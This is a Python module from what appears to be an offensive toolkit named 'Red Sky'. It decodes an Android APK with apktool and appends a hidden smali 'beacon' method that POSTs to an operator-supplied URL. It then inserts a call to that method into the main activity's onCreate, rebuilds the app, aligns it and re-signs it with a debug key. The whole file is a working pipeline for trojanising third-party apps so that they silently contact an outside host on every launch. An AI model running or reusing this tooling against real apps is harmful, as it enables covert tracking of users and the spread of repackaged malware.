# language: Python, file: Program/mobile/apk.py, target: Red Sky mobile — APK teardown / repack / inject
# Wraps apktool + zipalign + apksigner (all expected on PATH). Pulls the
# AndroidManifest, injects a small beacon into the app's main activity's
# onCreate, rebuilds, aligns, signs with a debug key you supply.

import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


MOB_DIR = OUTPUT_DIR / "mobile"
APK_DIR = MOB_DIR / "apks"


def _which(cmd: str) -> Optional[str]:
    return shutil.which(cmd)


def _run(args: List[str], cwd: str = "", timeout: int = 600) -> int:
    try:
        r = subprocess.run(args, cwd=cwd or None, capture_output=True, text=True, timeout=timeout)
        if r.returncode != 0 and r.stderr:
            print_warn(r.stderr.strip()[:400])
        return r.returncode
    except FileNotFoundError as e:
        print_err("missing tool: " + str(e))
        return 127
    except subprocess.TimeoutExpired:
        print_err("timeout: " + " ".join(args[:3]))
        return 124


def _check_tools() -> Dict[str, str]:
    needed = ["apktool", "zipalign", "apksigner", "keytool", "java"]
    out = {}
    for n in needed:
        p = _which(n)
        out[n] = p or ""
        if p:
            print_ok(n + " -> " + p)
        else:
            print_warn(n + " not found on PATH")
    return out


def cmd_info(apk_path: str) -> int:
    p = Path(apk_path).expanduser()
    if not p.exists():
        print_err("apk not found: " + str(p))
        return 1
    print_info("apk info")
    print_kv("file", p)
    print_kv("size", str(p.stat().st_size) + " bytes")

    # aapt if available — fastest manifest dump
    aapt = _which("aapt") or _which("aapt2")
    if aapt:
        try:
            r = subprocess.run([aapt, "dump", "badging", str(p)],
                               capture_output=True, text=True, timeout=60)
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    if any(line.startswith(k) for k in
                           ("package:", "application-label", "launchable-activity", "uses-permission",
                            "targetSdkVersion", "sdkVersion", "compileSdkVersion")):
                        print("  " + ARTERY + line.strip() + RESET)
        except Exception as e:
            print_warn("aapt failed: " + str(e))
    else:
        print_info("aapt not on PATH — install android-sdk build-tools for a full manifest dump")

    return 0


def cmd_decode(apk_path: str, out_name: str = "") -> int:
    APK_DIR.mkdir(parents=True, exist_ok=True)
    p = Path(apk_path).expanduser()
    if not p.exists():
        print_err("apk not found: " + str(p))
        return 1

    name = out_name or p.stem
    work = APK_DIR / (name + "_decoded")
    if work.exists():
        shutil.rmtree(work)

    print_info("apktool d " + p.name)
    rc = _run(["apktool", "d", "-f", "-o", str(work), str(p)])
    if rc != 0:
        print_err("decode failed")
        return rc

    # surface key files
    manifest = work / "AndroidManifest.xml"
    if manifest.exists():
        print_kv("manifest", manifest)
    smali_dirs = [d for d in work.iterdir() if d.is_dir() and d.name.startswith("smali")]
    print_kv("smali_dirs", len(smali_dirs))
    for d in smali_dirs:
        print("  " + ARTERY + d.name + RESET)
    print()
    print_ok("decoded to " + str(work))
    print_info("next: `redsky mobile apk inject " + str(work) + " --main-class com.example.MainActivity --beacon-url https://...`")
    return 0


BEACON_SMALI = """
.method private static _rs_beacon()V
    .locals 3

    :try_start_0
    new-instance v0, Ljava/net/URL;

    const-string v1, "$URL"

    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v1, "POST"

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    const-string v1, "Content-Type"

    const-string v2, "application/json"

    invoke-virtual {v0, v1, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    const-string v1, "{\\"event\\":\\"app_launched\\"}"

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V

    goto :goto_0

    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v0

    :goto_0
    return-void
.end method
"""

BEACON_CALL = """
    invoke-static {}, L$CLASS;->_rs_beacon()V
"""


def _find_smali_for_class(work: Path, class_name: str) -> Optional[Path]:
    """class_name = com.example.MainActivity -> smali/com/example/MainActivity.smali"""
    rel = class_name.replace(".", "/") + ".smali"
    for d in work.iterdir():
        if d.is_dir() and d.name.startswith("smali"):
            candidate = d / rel
            if candidate.exists():
                return candidate
    return None


def cmd_inject(work_dir: str, main_class: str, beacon_url: str) -> int:
    work = Path(work_dir).expanduser()
    if not work.exists():
        print_err("decoded dir not found: " + str(work))
        return 1

    smali = _find_smali_for_class(work, main_class)
    if not smali:
        print_err("could not find smali for " + main_class)
        print_info("look under " + str(work) + "/smali*/ for the right path")
        return 1

    print_info("injecting beacon into " + str(smali))
    text = smali.read_text(encoding="utf-8")

    # inject the static method right before the last .method block ends
    # simplest: append method to the file (smali allows reordering at class level)
    if "_rs_beacon" in text:
        print_warn("beacon already present — rewriting")
        # strip prior copy
        idx = text.find(".method private static _rs_beacon()V")
        if idx >= 0:
            end = text.find(".end method", idx)
            if end >= 0:
                text = text[:idx] + text[end + len(".end method"):]

    method = BEACON_SMALI.replace("$URL", beacon_url)
    text = text.rstrip() + "\n\n" + method

    # inject the call into onCreate
    call = "\n    invoke-static {}, L" + main_class.replace(".", "/") + ";->_rs_beacon()V\n"
    oncreate = ".method protected onCreate(Landroid/os/Bundle;)V"
    idx = text.find(oncreate)
    if idx < 0:
        print_warn("no onCreate found — call won't fire automatically, add it manually to a lifecycle method")
    else:
        # find first newline after the .locals line in onCreate
        loc = text.find(".locals", idx)
        nl = text.find("\n", loc)
        if nl > 0:
            text = text[:nl+1] + call + text[nl+1:]
            print_ok("inserted call into onCreate")

    smali.write_text(text, encoding="utf-8")
    print_ok("beacon injected -> " + beacon_url)
    print()
    print_info("next: `redsky mobile apk build " + str(work) + " --keystore ~/.android/debug.keystore --alias androiddebugkey --store-pass android --key-pass android`")
    return 0


def cmd_build(work_dir: str, keystore: str, alias: str, store_pass: str, key_pass: str,
              out_apk: str = "") -> int:
    work = Path(work_dir).expanduser()
    if not work.exists():
        print_err("decoded dir not found: " + str(work))
        return 1

    APK_DIR.mkdir(parents=True, exist_ok=True)
    name = work.name.replace("_decoded", "") + "_patched"
    unsigned = APK_DIR / (name + "-unsigned.apk")
    aligned = APK_DIR / (name + "-aligned.apk")
    signed = Path(out_apk) if out_apk else APK_DIR / (name + ".apk")

    print_info("apktool b")
    rc = _run(["apktool", "b", "-o", str(unsigned), str(work)])
    if rc != 0:
        print_err("build failed")
        return rc
    print_ok("built " + str(unsigned))

    zipalign = _which("zipalign") or _which("zipalign")
    if zipalign:
        print_info("zipalign")
        rc = _run([zipalign, "-p", "-f", "4", str(unsigned), str(aligned)])
        if rc != 0:
            print_err("zipalign failed")
            return rc
        print_ok("aligned " + str(aligned))
    else:
        aligned = unsigned
        print_warn("zipalign not on PATH — skipping align")

    print_info("apksigner sign")
    rc = _run([
        "apksigner", "sign",
        "--ks", str(Path(keystore).expanduser()),
        "--ks-key-alias", alias,
        "--ks-pass", "pass:" + store_pass,
        "--key-pass", "pass:" + key_pass,
        "--out", str(signed),
        str(aligned),
    ])
    if rc != 0:
        print_err("signing failed")
        return rc

    # verify
    rc = _run(["apksigner", "verify", "--print-certs", str(signed)])
    if rc == 0:
        print_ok("signature verified")
    print()
    print_ok("patched apk: " + str(signed))
    print_kv("size", str(signed.stat().st_size) + " bytes")
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky mobile apk", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="info", choices=["info", "decode", "inject", "build", "tools"])
    p.add_argument("apk", nargs="?", default="")
    p.add_argument("--name", default="")
    p.add_argument("--main-class", default="")
    p.add_argument("--beacon-url", default="")
    p.add_argument("--keystore", default="~/.android/debug.keystore")
    p.add_argument("--alias", default="androiddebugkey")
    p.add_argument("--store-pass", default="android")
    p.add_argument("--key-pass", default="android")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky mobile apk <info|decode|inject|build|tools> <apk-or-dir>")
        return 2

    if ns.help:
        print_info("redsky mobile apk tools")
        print_info("redsky mobile apk info   target.apk")
        print_info("redsky mobile apk decode target.apk --name myapp")
        print_info("redsky mobile apk inject Output/mobile/apks/myapp_decoded --main-class com.foo.MainActivity --beacon-url https://x/")
        print_info("redsky mobile apk build  Output/mobile/apks/myapp_decoded")
        return 0

    if ns.action == "tools":
        _check_tools()
        return 0
    if ns.action == "info":
        if not ns.apk:
            print_err("give an apk path")
            return 2
        return cmd_info(ns.apk)
    if ns.action == "decode":
        if not ns.apk:
            print_err("give an apk path")
            return 2
        return cmd_decode(ns.apk, ns.name)
    if ns.action == "inject":
        if not ns.apk or not ns.main_class or not ns.beacon_url:
            print_err("need <decoded-dir> --main-class X --beacon-url Y")
            return 2
        return cmd_inject(ns.apk, ns.main_class, ns.beacon_url)
    if ns.action == "build":
        if not ns.apk:
            print_err("give a decoded dir")
            return 2
        return cmd_build(ns.apk, ns.keystore, ns.alias, ns.store_pass, ns.key_pass, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
